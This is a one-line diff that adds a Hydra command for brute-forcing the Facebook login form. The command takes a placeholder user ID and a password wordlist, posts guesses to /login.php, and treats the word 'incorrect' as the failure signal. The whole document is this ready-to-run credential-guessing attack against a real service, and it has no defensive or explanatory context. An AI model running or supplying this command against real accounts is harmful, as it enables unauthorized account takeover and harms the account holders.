@@ -1,0 +1,1 @@
+hydra -l <UID> -P /path/to/wordlist.txt facebook.com https-post-form "/login.php:email=^USER^&pass=^PASS^:F=incorrect"
